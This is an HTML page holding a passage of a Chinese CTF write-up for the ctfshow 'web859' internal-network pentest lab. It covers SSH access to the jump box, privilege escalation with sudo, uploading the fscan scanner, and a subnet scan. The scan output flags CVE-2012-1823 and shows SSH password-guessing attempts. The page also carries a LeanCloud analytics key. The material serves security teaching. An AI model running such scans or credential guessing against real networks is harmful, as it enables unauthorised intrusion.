@@ -1,0 +1,1003 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言注意：  本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链 本次打靶全程使用Kali环境  为培养新生对渗透测试与内网攻防的兴趣，HASHTEAM 新年活动选取了 ctfshow 平台上的一道入门渗透题目 题目位置： ctfshow → web 入门 → 内网渗透 → web859（有跳板机）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web859_有跳板机">
+<meta property="og:url" content="http://example.com/2026/test65/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言注意：  本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链 本次打靶全程使用Kali环境  为培养新生对渗透测试与内网攻防的兴趣，HASHTEAM 新年活动选取了 ctfshow 平台上的一道入门渗透题目 题目位置： ctfshow → web 入门 → 内网渗透 → web859（有跳板机）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221183.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221363.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221002.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221980.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221412.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221657.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221922.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221519.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221881.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222782.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222560.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222178.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222798.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222865.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222711.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222486.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222943.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222630.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222507.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222272.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222850.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222764.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222716.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222176.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222484.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222720.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222371.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222242.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222019.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223828.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223390.png">
+<meta property="article:published_time" content="2026-04-15T10:15:47.637Z">
+<meta property="article:modified_time" content="2026-04-15T14:23:27.581Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221183.png">
+  
+  
+  
+  <title>ctfshow web859_有跳板机 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ctfshow web859_有跳板机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:15" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow web859_有跳板机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注意：</p>
+<blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+<p>本次打靶全程使用Kali环境</p>
+</blockquote>
+<p>为培养新生对渗透测试与内网攻防的兴趣，HASHTEAM 新年活动选取了 ctfshow 平台上的一道入门渗透题目</p>
+<p>题目位置： ctfshow → web 入门 → 内网渗透 → web859（有跳板机）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221183.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>ctfshow平台地址：<a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></p>
+<p>题目描述：</p>
+<blockquote>
+<p>来自2023年2月的RealWorldCTF渗透赛环境</p>
+<p>需要本地ssh 链接题目给的地址和端口，作为<strong>攻击机</strong></p>
+<p>攻击机<strong>不出网</strong></p>
+<p>攻击机预置了某些工具，可以自己使用</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> 环境生成的端口号<br></code></pre></td></tr></table></figure>
+
+<p>用户名是ctfshow密码也是ctfshow</p>
+</blockquote>
+<h1 id="SSH连接跳板机"><a href="#SSH连接跳板机" class="headerlink" title="SSH连接跳板机"></a>SSH连接跳板机</h1><p>这里我们ssh连接跳板机</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -p28254<br></code></pre></td></tr></table></figure>
+
+<p>当提示是否继续时输入 <code>yes</code> 并回车，随后根据提示输入密码（本题为 <code>ctfshow</code>）。密码输入过程中终端不会回显，这是系统的安全机制，输入完成后直接按回车即可。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221363.png" srcset="/img/loading.gif" lazyload alt="image-20260216083704955"></p>
+<p>连接成功，我们切换为root权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> su<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221002.png" srcset="/img/loading.gif" lazyload alt="image-20260216083751559"></p>
+<p><code>ifconfig</code>查看网段</p>
+<blockquote>
+<p>该靶机网段每次重启都变化，因此文中的网段多次调整，仅供参考。实际操作请以当前环境的网段为准。</p>
+</blockquote>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@shell:/#  ifconfig<br><span class="hljs-attribute">eth0</span>: flags=<span class="hljs-number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1450</span><br>        <span class="hljs-attribute">inet</span> <span class="hljs-number">172.2.164.4</span>  netmask <span class="hljs-number">255.255.255.0</span>  broadcast <span class="hljs-number">172.2.164.255</span><br>        <span class="hljs-attribute">ether</span> <span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">02</span>:d4:<span class="hljs-number">04</span>  txqueuelen <span class="hljs-number">0</span>  (Ethernet)<br>        <span class="hljs-attribute">RX</span> packets <span class="hljs-number">698</span>  bytes <span class="hljs-number">60498</span> (<span class="hljs-number">60</span>.<span class="hljs-number">4</span> KB)<br>        <span class="hljs-attribute">RX</span> errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        <span class="hljs-attribute">TX</span> packets <span class="hljs-number">820</span>  bytes <span class="hljs-number">156138</span> (<span class="hljs-number">156</span>.<span class="hljs-number">1</span> KB)<br>        <span class="hljs-attribute">TX</span> errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br><br><span class="hljs-attribute">lo</span>: flags=<span class="hljs-number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="hljs-number">65536</span><br>        <span class="hljs-attribute">inet</span> <span class="hljs-number">127.0.0.1</span>  netmask <span class="hljs-number">255.0.0.0</span><br>        <span class="hljs-attribute">loop</span>  txqueuelen <span class="hljs-number">1000</span>  (Local Loopback)<br>        <span class="hljs-attribute">RX</span> packets <span class="hljs-number">312</span>  bytes <span class="hljs-number">23016</span> (<span class="hljs-number">23</span>.<span class="hljs-number">0</span> KB)<br>        <span class="hljs-attribute">RX</span> errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span><br>        <span class="hljs-attribute">TX</span> packets <span class="hljs-number">312</span>  bytes <span class="hljs-number">23016</span> (<span class="hljs-number">23</span>.<span class="hljs-number">0</span> KB)<br>        <span class="hljs-attribute">TX</span> errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>处于<code>172.2.164.4/24</code>网段，<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">fscan</a>开路，有ssh的话用scp来传：</p>
+<blockquote>
+<p><strong>scp命令</strong> 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#将fscan上传到/tmp目录下面</span><br>scp -P <span class="hljs-number">28254</span> <span class="hljs-regexp">/home/m</span>atrix<span class="hljs-regexp">/Desktop/</span>fscan_all_version<span class="hljs-regexp">/fscan ctfshow@pwn.challenge.ctf.show:/</span>tmp<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221247.png" srcset="/img/loading.gif" lazyload alt="image-20260216084836372"></p>
+<p>开扫</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># scp上传上去可以直接用，不需要赋权限</span><br><span class="hljs-symbol">./fscan</span> <span class="hljs-operator">-</span>h <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span><span class="hljs-symbol">/24</span><br><br>   ___                              _    <br>  <span class="hljs-symbol">/</span> _ \     ___  ___ _ __ __ _  ___| | __ <br> <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_\<span class="hljs-operator">/</span>____<span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> __| &#x27;__<span class="hljs-symbol">/</span> _` |<span class="hljs-symbol">/</span> __| |<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span><br><span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>_\\_____\__ \ (__| | | (_| | (__|   <span class="hljs-operator">&lt;</span>    <br>\____<span class="hljs-symbol">/</span>     |___<span class="hljs-operator">/</span>\___|_|  \__,_|\___|_|\_\   <br>                     fscan <span class="hljs-params">version:</span> <span class="hljs-number">1.8</span>.<span class="hljs-number">4</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.1</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.5</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.6</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.7</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.2</span>     is alive<br>(icmp) Target <span class="hljs-number">172.2</span>.<span class="hljs-number">164.3</span>     is alive<br>[<span class="hljs-operator">*</span>] Icmp alive hosts len <span class="hljs-params">is:</span> <span class="hljs-number">7</span><br><span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> open<br><span class="hljs-number">172.2</span>.<span class="hljs-number">164.5</span>:<span class="hljs-number">80</span> open<br><span class="hljs-number">172.2</span>.<span class="hljs-number">164.6</span>:<span class="hljs-number">139</span> open<br><span class="hljs-number">172.2</span>.<span class="hljs-number">164.5</span>:<span class="hljs-number">9000</span> open<br><span class="hljs-number">172.2</span>.<span class="hljs-number">164.6</span>:<span class="hljs-number">445</span> open<br>[<span class="hljs-operator">*</span>] alive ports len <span class="hljs-params">is:</span> <span class="hljs-number">5</span><br>start vulscan<br>[<span class="hljs-operator">*</span>] WebTitle http:<span class="hljs-symbol">//172.2.164.5</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">2880</span>   title:欢迎登陆CTFshow文件管理系统<br>[<span class="hljs-operator">+</span>] FCGI <span class="hljs-number">172.2</span>.<span class="hljs-number">164.5</span>:<span class="hljs-number">9000</span> <br><span class="hljs-params">Status:</span> <span class="hljs-number">403</span> Forbidden                                                                                                                               <br><span class="hljs-params">X-Powered-By:</span> PHP<span class="hljs-symbol">/7.3.22</span>                                                                                                                            <br><span class="hljs-params">Content-type:</span> text<span class="hljs-symbol">/html</span>; <span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span>                                                                                                   <br>Access denied.                                                                                                                                      <br>stderr:Access to the script &#x27;<span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>issue&#x27; has been denied (see security.limit_extensions)                                                            <br>plesa try other path,as <span class="hljs-operator">-</span>path <span class="hljs-symbol">/www/wwwroot/index.php</span>                                                                                                <br>[<span class="hljs-operator">*</span>] NetBios <span class="hljs-number">172.2</span>.<span class="hljs-number">164.6</span>     oa                                  Windows <span class="hljs-number">6.1</span>                                                                         <br>[<span class="hljs-operator">*</span>] OsInfo <span class="hljs-number">172.2</span>.<span class="hljs-number">164.6</span>  (Windows <span class="hljs-number">6.1</span>)<br>[<span class="hljs-operator">+</span>] PocScan http:<span class="hljs-symbol">//172.2.164.5</span> poc-yaml-php-cgi-cve-<span class="hljs-number">201</span>2-<span class="hljs-number">1823</span> <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> root root@<span class="hljs-number">123</span> <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> root <span class="hljs-number">123456</span><span class="hljs-operator">!</span>a <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> root sysadmin <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> admin <span class="hljs-number">111111</span> <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> admin <span class="hljs-number">12345678</span> <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">5</span><span class="hljs-symbol">/6</span> [-] ssh <span class="hljs-number">172.2</span>.<span class="hljs-number">164.4</span>:<span class="hljs-number">22</span> admin Aa1234 <span class="hljs-params">ssh:</span> handshake <span class="hljs-params">failed:</span> <span class="hljs-params">ssh:</span> unable to authenticate, attempted methods [none password], no supported methods remain <br>已完成 <span class="hljs-number">6</span><span class="hljs-symbol">/6</span><br>[<span class="hljs-operator">*</span>] 扫描结束,耗时: <span class="hljs-number">7</span>m5.<span class="hljs-number">683021329</span>s<br></code></pre></td></tr></table></figure>
+
+<p>这里存活主机有<strong>7 台</strong>，但是开放端口的主机只有<strong>3台</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">172</span>.<span class="hljs-number">2</span>.<span class="hljs-number">164</span>.<span class="hljs-number">4</span>    跳板机                      SSH服务（<span class="hljs-number">22</span>端口)              SSH连接<br><span class="hljs-attribute">172</span>.<span class="hljs-number">2</span>.<span class="hljs-number">164</span>.<span class="hljs-number">5</span>    CTFshow文件管理系统          Web服务器（<span class="hljs-number">80</span>）+ FCGI（<span class="hljs-number">9000</span>）  cve-<span class="hljs-number">2012</span>-<span class="hljs-number">1823</span> <br><span class="hljs-attribute">172</span>.<span class="hljs-number">2</span>.<span class="hljs-number">164</span>.<span class="hljs-number">6</span>    WORKGROUP\oa               Windows <span class="hljs-number">6</span>.<span class="hljs-number">1</span>（<span class="hljs-number">139</span>/<span class="hljs-number">445</span>端口开放）<br></code></pre></td></tr></table></figure>
+
+<p>Windows 6.1这里指的是 Windows 7 或 Server 2008 R2。</p>
+<blockquote>
+<p>微软内部的**内核版本号（Kernel Version）**命名规则：</p>
+<ul>
+<li><strong>5.1</strong> &#x3D; Windows XP</li>
+<li><strong>5.2</strong> &#x3D; Windows Server 2003</li>
+<li><strong>6.0</strong> &#x3D; Windows Vista &#x2F; Server 2008</li>
+<li><strong>6.1 &#x3D; Windows 7 &#x2F; Server 2008 R2</strong></li>
+<li><strong>6.2</strong> &#x3D; Windows 8 &#x2F; Server 2012</li>
+<li><strong>6.3</strong> &#x3D; Windows 8.1 &#x2F; Server 2012 R2</li>
+<li><strong>10.0</strong> &#x3D; Windows 10 &#x2F; 11 &#x2F; Server 2016+</li>
+</ul>
+</blockquote>
+<p>139&#x2F;445这两个端口是 <strong>SMB (Server Message Block)</strong> 协议的标准端口：</p>
+<ul>
+<li><strong>139</strong>: NetBIOS Session Service（老版本）</li>
+<li><strong>445</strong>: Microsoft-DS（现代 SMB over TCP）</li>
